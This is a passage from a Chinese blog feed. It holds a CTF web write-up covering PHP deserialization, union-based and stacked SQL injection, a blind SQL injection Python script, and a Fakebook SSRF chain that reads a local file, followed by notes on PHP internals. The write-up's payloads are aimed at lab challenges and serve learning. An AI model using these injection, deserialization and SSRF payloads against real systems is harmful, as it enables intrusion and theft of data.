class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-comment">//</span><br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//这个地方强制转换，得想办法处理</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//传参必须是 ascii 可显示字符</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);      <span class="hljs-comment">//反序列化 str变量</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个 op = 1 不太想用，看 =2 的情况</p><p>我们需要解决一下几个问题：</p><ul><li>protect之后的特殊字符</li><li> if($this-&gt;op === “2”)</li></ul><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102232636.png" alt="image-20220110223245549"></p><p>可见，题目环境 PHP_version &gt;7.1 因此我们可以直接把 protected =&gt; public，因为7.1以上版本对类属性不敏感</p><p>而if的强比较可以 赋值 int(2) 这样 int!=string 因此也破坏了比较</p><p>于是有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;./flag.php&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>我不会</p><p>看了看wp，发现在查询之后源码中会有一个hint</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br>base32 -&gt; base64 : select * from user where username = &#x27;$name&#x27;<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">可以了解到这里 只查了 username 但是没有检查 passwd 字段，就是说然后怎么办，一定还是有判断的，但是是体现在后端处理逻辑这里，实时也是如此，这里如果我们用 Union select 的话查到没有的字段就会自己创建一个虚拟的出来</code></pre></div><p>这题一共有三个字段 <code>admin&#39; union select 1,2,3,4#</code> </p><p>报错： Error: The used SELECT statements have a different number of columns</p><p>因此有三个字段</p><p>因此我们的 测试的基础是 <code>admin&#39; union select 1,2,3#</code></p><p>一般这种都是 id username passwd 对吧</p><p>于是 有 <code>admin&#39; union select 1,&#39;admin&#39;,3#</code></p><div class="code-wrapper"><pre><code class="hljs">那么还有一个passwd 这就是 后端匹配密码实际匹配的MD5处理后的结果，依照上面说的其实union select 只有查到完全一模一样的数据才会虚拟一个出来，那我们这里passwd字段可控 于是可以自定义密码直接传</code></pre></div><p>最后有 <code>1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></p><p>MD5解密结果是123</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>额，算是强网杯那道的pro版本</p><p>基本这种算是固定 而且吃知识的直接记住吧</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><blockquote><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p></blockquote><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>脚本…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://bbe3dc91-a652-40aa-9642-ab097978e0bd.node4.buuoj.cn:81/index.php&quot;</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>    l = <span class="hljs-number">33</span><br>    r =<span class="hljs-number">130</span><br>    mid = (l+r)&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(l&lt;r):<br>        payload[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;0^&quot;</span> + <span class="hljs-string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        html = requests.post(url,data=payload)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            l = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            r = mid<br>        mid = (l+r)&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid)==<span class="hljs-string">&quot; &quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    result = result + <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag: &quot;</span> ,result)<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>看了看只有两个功能，一定是有一个功能在执行中可以修改一些字段达到利用的目的</p><p>访问 robots.txt 得到 备份路径 /user.php.bak 访问下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>一个很明显的ssrf</p><p>牛逼，我卡住了，原来在view.php哪里还有一个sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">view.php?<span class="hljs-keyword">no</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#<br></code></pre></td></tr></table></figure><p>并确定了 2 的位置 为可回显的位置</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">new</span> UserInfo();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>最后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">view</span>.php?no=-<span class="hljs-number">1</span>/**/union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),&#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;#<br></code></pre></td></tr></table></figure><p>一开始我以为flag会直接体现在注释里</p><p>直到我发现</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121318798.png" alt="image-20220112131756625"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP内核学习及部分样例</title>
    <link href="https://d3n13d.github.io/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/"/>
    <id>https://d3n13d.github.io/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/</id>
    <published>2022-01-11T03:55:42.000Z</published>
    <updated>2022-01-11T03:58:27.032Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="内核剖析"><a href="#内核剖析" class="headerlink" title="内核剖析"></a>内核剖析</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li><p><strong>build</strong> 放置和源码编译相关的文件，比如 buildconf，和检查环境的脚本</p></li><li><p><strong>ext</strong>     拓展目录，所有非php基础功能比如 <strong>substring</strong> 都在这个目录以下</p></li><li><p><strong>main</strong>   PHP基础设施</p></li><li><p><strong>Zend</strong>   Zend主要实现语言核心的运行环境，比如脚本语法解析，opcode执行及其拓展机制</p></li><li><p><strong>pear</strong>    PHP拓展与应用仓库，包含PEAR核心文件</p></li><li><p><strong>sapi</strong>    和各种服务器的接口调用，例如apache、IIS等，也包含一般的fastcgi、cgi等</p></li><li><p><strong>win32</strong>    Windows环境下编译PHP有关脚本</p></li><li><p><strong>TSRM</strong>     线程安全目录</p></li></ul><h3 id="PHP生命周期"><a href="#PHP生命周期" class="headerlink" title="PHP生命周期"></a>PHP生命周期</h3><p>​    SAPI指PHP具体应用的编程接口，一切以 <strong>SAPI 开始</strong>，无论是php-cli，还是php-server。比如我们命令行参数传递给PHP解释器要执行的脚本，相当于是通过URL请求了一个PHP页面。</p><p>​    PHP 执行的两个阶段，处理请求之前的开始阶段，请求之后的结束阶段。</p><p>​    处理请求之前的的开始阶段包括 ：</p><p>​        1️⃣ 模块初始化阶段 (MINIT)，只执行一次</p><p>​        2️⃣ 模块激活阶段 (RINIT)</p><h4 id="单进程的SAPI生命周期"><a href="#单进程的SAPI生命周期" class="headerlink" title="单进程的SAPI生命周期"></a>单进程的SAPI生命周期</h4><p><strong>CLI/CGI模式</strong>都属于单进程的SASPI模式</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101726955.png" alt="image-20220110172604804"></p><p>如图完成了一个 接受参数 -&gt; 创建进程 -&gt; 处理请求 -&gt; 销毁进程 -&gt; 终止进程的操作</p><h4 id="多进程的SAPI生命周期"><a href="#多进程的SAPI生命周期" class="headerlink" title="多进程的SAPI生命周期"></a>多进程的SAPI生命周期</h4><p>​    通常PHP是<strong>编译一个中间件的模块</strong>来处理PHP请求。Apache一般会采取多进程模式。Apache会fork出多个子进程，每个进程内存空间相对独立，整个进程的生命周期会处理多个请求，只有apache关闭或者进程结束后才会进行关闭阶段。</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101732820.png" alt="image-20220110173239751"></p><p>多线程的SAPI生命周期和 多进程类似，不同的是多线程是在生命周期里<strong>并行的重复 请求 关闭的阶段</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101733999.png" alt="image-20220110173308947"></p><h3 id="SAPI概述"><a href="#SAPI概述" class="headerlink" title="SAPI概述"></a>SAPI概述</h3><p>​    PHP中和服务相关的操作都是通过SAPI的接口实现</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101735370.png" alt="image-20220110173552318"></p><p>​    各个服务的抽象层值之间遵守着相同的约定，这里称之为 SAPI 接口。每个SAPI实现都是一个 _sapi_moudle_struct 结构体变量。</p><p>​    demo:</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">php_cgi_startup</span><span class="hljs-params">(sapi_module_struct *sapi_module)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (php_module_startup(sapi_module, &amp;cgi_module_entry, <span class="hljs-number">1</span>) == FAILURE) &#123;<br><span class="hljs-keyword">return</span> FAILURE;<br>&#125;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过测试这个返回值是 string(6) “SUCCESS”，而且可以用作条件判断</p><p><code>if(php_cgi_startup())&#123; echo 1;&#125;</code></p><p>如果 SUCCESS，输出1</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>**CGI **能实现语言解释器与web服务器的通信。</p><p><strong>FastCGI</strong> 服务器中间件和某个语言后端 进行数据交换的协议，它可以一直执行，还可以支持分布式运算</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102325878.png" alt="image-20220110232512816"></p><h2 id="PHP脚本执行"><a href="#PHP脚本执行" class="headerlink" title="PHP脚本执行"></a>PHP脚本执行</h2><blockquote><p>从这里开始就开始分几个二级标题，因为我觉得这已经脱离了前置知识的范畴</p></blockquote><p>​    先来说一说PHP，PHP是解释性语言，它无需编译即可“直接运行”</p><p>​    但是我们知道最底层是机器语言，实际上还是要有一个转换过程的，这个时候就回需要一个<strong>解释器</strong>，由解释器来执行这些代码，一般会在运行时实时编译，以此来提高效率。PHP为了提高执行效率，提出了opcode缓存拓展(APC,xcache,eAccelerator等)，这样就可以避免重新编译带来的性能损失。</p><p>​    一般来说，程序会经过这样的阶段：</p><p>​        1️⃣传递给php需要执行的文件</p><p>​        2️⃣php完成准备工作后启动PHP及Zend虚拟机，加载注册的拓展模块</p><p>​        3️⃣读取脚本，Zend引擎对脚本文件进行词法分析，语法分析</p><p>​        4️⃣编译为opcode</p><p>对于语法分析见($PHP_SRC/Zend/zend_language_parser)，它将源代码切成数组</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201110002241.png" alt="image-20220111000256180"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">zend_value</span> &#123;</span>   <span class="hljs-comment">//变量存储在这个联合体里</span><br>zend_long         lval;<span class="hljs-comment">/* long value */</span><br><span class="hljs-keyword">double</span>            dval;<span class="hljs-comment">/* double value */</span><br>zend_refcounted  *counted;<br>zend_string      *str;<br>zend_array       *arr;<br>zend_object      *obj;<br>zend_resource    *res;<br>zend_reference   *ref;   <span class="hljs-comment">//引用次数</span><br>zend_ast_ref     *ast;<br>zval             *zv;<br><span class="hljs-keyword">void</span>             *ptr;<br>zend_class_entry *ce;<br>zend_function    *func;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span> w1;<br><span class="hljs-keyword">uint32_t</span> w2;<br>&#125; ww;<br>&#125; zend_value;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zval_struct</span> &#123;</span><br>zend_value        value;<span class="hljs-comment">/* value */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ZEND_ENDIAN_LOHI_3(<br>zend_uchar    type,<span class="hljs-comment">/* active type */</span><br>zend_uchar    type_flags,<br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">uint16_t</span>  extra;        <span class="hljs-comment">/* not further specified */</span><br>&#125; u)<br>&#125; v;<br><span class="hljs-keyword">uint32_t</span> type_info;<br>&#125; u1;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span>     next;                 <span class="hljs-comment">/* hash collision chain */</span><br><span class="hljs-keyword">uint32_t</span>     cache_slot;           <span class="hljs-comment">/* cache slot (for RECV_INIT) */</span><br><span class="hljs-keyword">uint32_t</span>     opline_num;           <span class="hljs-comment">/* opline number (for FAST_CALL) */</span><br><span class="hljs-keyword">uint32_t</span>     lineno;               <span class="hljs-comment">/* line number (for ast nodes) */</span><br><span class="hljs-keyword">uint32_t</span>     num_args;             <span class="hljs-comment">/* arguments number for EX(This) */</span><br><span class="hljs-keyword">uint32_t</span>     fe_pos;               <span class="hljs-comment">/* foreach position */</span><br><span class="hljs-keyword">uint32_t</span>     fe_iter_idx;          <span class="hljs-comment">/* foreach iterator index */</span><br><span class="hljs-keyword">uint32_t</span>     access_flags;         <span class="hljs-comment">/* class constant access flags */</span><br><span class="hljs-keyword">uint32_t</span>     property_guard;       <span class="hljs-comment">/* single property guard */</span><br><span class="hljs-keyword">uint32_t</span>     constant_flags;       <span class="hljs-comment">/* constant flags */</span><br><span class="hljs-keyword">uint32_t</span>     extra;                <span class="hljs-comment">/* not further specified */</span><br>&#125; u2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>哈希表：通过哈希函数，讲特定的键映射到特定的值的数据结构，维护键和值的对应关系，但是时间复杂度是O(1)比链表O(n)，效率更高</p><h2 id="PHP经典问题解析"><a href="#PHP经典问题解析" class="headerlink" title="PHP经典问题解析"></a>PHP经典问题解析</h2><h3 id="PHP字符串解析问题"><a href="#PHP字符串解析问题" class="headerlink" title="PHP字符串解析问题"></a>PHP字符串解析问题</h3><p>首先来看一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 